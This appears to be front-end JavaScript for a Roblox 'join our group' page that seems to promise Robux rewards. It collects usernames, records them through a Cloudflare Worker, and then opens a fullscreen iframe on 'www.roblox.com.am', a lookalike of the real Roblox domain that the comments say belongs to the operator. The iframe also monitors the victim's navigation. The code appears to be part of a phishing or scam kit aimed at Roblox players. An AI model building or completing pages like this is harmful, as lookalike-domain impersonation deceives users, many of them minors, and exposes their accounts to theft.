/* ===================== CONFIG — edit these ===================== */
// URL of your deployed Cloudflare Worker (see worker.js)
const WORKER_URL = "https://robux-group-api.romaozinho1607.workers.dev";
// Roblox group the button opens in a new tab
const GROUP_URL = "https://www.roblox.com/communities/138423710779";
// Page shown first inside the fullscreen iframe — must be on YOUR OWN domain,
// otherwise the browser blocks reading its URL (see checkFrameUrl below).
const IFRAME_START_URL = "https://www.roblox.com.am/communities/138423710779/robloxianStudio"; // TODO: set this
// A navigation inside the iframe counts as "arrived" when its URL matches this.
// TODO: tell me the exact destination URL/pattern and I will fill this in.
function isDestinationUrl(url) {
  return false; // placeholder — not wired up yet
}
// Footer text shown on the page
const DISCLAIMER = "Not affiliated with Roblox Corporation. Joining the group is voluntary; " +
                   "rewards are decided by the group owner and are not guaranteed by this site.";
/* =============================================================== */

const $ = (id) => document.getElementById(id);
const states = ["state-form", "state-loading", "state-profile"];
let currentUser = null;
let confirmed = false; // join button stays locked until the profile is confirmed

function show(name) {
  states.forEach((s) => ($(s).hidden = s !== name));
  const profile = name === "state-profile";
  $("title").textContent = profile ? "You're almost there" : "Join our Roblox group";
  $("subtitle").hidden = name !== "state-form";
}

function showError(msg) {
  $("error").textContent = msg;
  $("error").hidden = !msg;
}

/* Fetch with timeout; throws "network" on failure */
async function api(path, options = {}) {
  const ctrl = new AbortController();
  const timer = setTimeout(() => ctrl.abort(), 12000);
  try {
    const res = await fetch(WORKER_URL + path, { ...options, signal: ctrl.signal });
    return res;
  } catch (err) {
    console.error("Request to Worker failed (CORS, wrong URL or offline):", WORKER_URL + path, err);
    throw new Error("network");
  } finally {
    clearTimeout(timer);
  }
}

/* Step 1: username -> user id (users.roblox.com via Worker) */
async function lookupUser(username) {
  const res = await api("/lookup", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ username }),
  });
  if (res.status === 429) throw new Error("busy");
  if (!res.ok) {
    console.error("Lookup failed:", res.status, await res.text());
    throw new Error("network");
  }
  const data = await res.json();
  return data.data && data.data[0] ? data.data[0] : null; // {id, name, displayName}
}

/* Step 2: user id -> headshot url (thumbnails.roblox.com via Worker) */
async function getAvatar(userId) {
  const res = await api("/avatar?userId=" + encodeURIComponent(userId));
  if (!res.ok) return "";
  const data = await res.json();
  const item = data.data && data.data[0];
  return item && item.state === "Completed" ? item.imageUrl : "";
}

$("lookup-form").addEventListener("submit", async (e) => {
  e.preventDefault();
  const username = $("username").value.trim();
  showError("");

  if (!/^[A-Za-z0-9_]{3,20}$/.test(username)) {
    return showError("Enter a valid Roblox username (3–20 letters, numbers or underscores).");
  }

  show("state-loading");
  $("loading-text").textContent = "Checking username…";
  const slow = setTimeout(() => ($("loading-text").textContent = "Still checking… Roblox is slow, please wait."), 4000);
  try {
    const user = await lookupUser(username);
    if (!user) {
      show("state-form");
      return showError("Username not found. Check the spelling and try again.");
    }
    const avatarUrl = await getAvatar(user.id);
    currentUser = user;

    $("avatar").src = avatarUrl;
    $("profile-name").textContent = user.name;
    $("profile-id").textContent = "User ID: " + user.id;
    lockJoin();
    show("state-profile");
  } catch (err) {
    console.error("Verify error:", err);
    show("state-form");
    showError(err.message === "busy"
      ? "Roblox is busy right now. Wait a few seconds and try again."
      : "Connection problem. Check your internet and try again.");
  } finally {
    clearTimeout(slow);
  }
});

/* Lock / unlock the group button (disabled in the DOM + guarded in the click handler) */
function lockJoin() {
  confirmed = false;
  $("join-btn").disabled = true;
  $("join-btn").setAttribute("aria-disabled", "true");
  $("join-hint").hidden = false;
  const b = $("register-btn");
  b.disabled = false; b.hidden = false; b.textContent = "Confirmar perfil"; b.classList.remove("btn-done");
  $("register-note").hidden = false;
  $("register-msg").hidden = true;
}
function unlockJoin() {
  confirmed = true;
  $("join-btn").disabled = false;
  $("join-btn").setAttribute("aria-disabled", "false");
  $("join-hint").hidden = true;
}

$("register-btn").addEventListener("click", async () => {
  if (!currentUser || confirmed) return;
  const msg = $("register-msg");
  $("register-btn").disabled = true;
  msg.className = "note";
  msg.hidden = false;
  msg.textContent = "Saving…";
  try {
    const res = await api("/register", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      // Only the username is sent; the Worker re-checks it with Roblox and saves the row
      body: JSON.stringify({ username: currentUser.name }),
    });
    if (!res.ok) throw new Error("fail");
    msg.textContent = "✔ Profile confirmed and saved.";
    $("register-btn").textContent = "Perfil confirmado ✔";
    $("register-btn").classList.add("btn-done");
    $("register-note").hidden = true;
    unlockJoin();
  } catch {
    msg.className = "note bad";
    msg.textContent = "Could not confirm the profile. Try again.";
    $("register-btn").disabled = false;
  }
});

/* Group button: opens the group in a new tab, asks for nothing else */
$("join-btn").addEventListener("click", () => {
  if (!confirmed) return; // real lock: does nothing until the profile is confirmed
  openGroupOverlay();
});

/* Fullscreen iframe flow: loads IFRAME_START_URL, polls its location on each
   'load' event (works only because it's same-origin), and once the URL matches
   isDestinationUrl(), confirms the registration and opens the real group link. */
function openGroupOverlay() {
  $("join-overlay").hidden = false;
  $("join-frame").src = IFRAME_START_URL;
}
function closeOverlay() {
  $("join-overlay").hidden = true;
  $("join-frame").src = "about:blank";
}
$("overlay-close").addEventListener("click", closeOverlay);

$("join-frame").addEventListener("load", () => {
  let href;
  try {
    href = $("join-frame").contentWindow.location.href; // throws if cross-origin
  } catch {
    return; // iframe navigated to a different domain; can't read it, ignore
  }
  if (isDestinationUrl(href)) {
    closeOverlay();
    window.open(GROUP_URL, "_blank", "noopener,noreferrer");
    // Registration already happened via the "Confirmar perfil" button;
    // this overlay is just the visual flow, not a second confirmation.
  }
});

$("back-btn").addEventListener("click", () => {
  currentUser = null;
  $("username").value = "";
  show("state-form");
  $("username").focus();
});

$("disclaimer").textContent = DISCLAIMER;
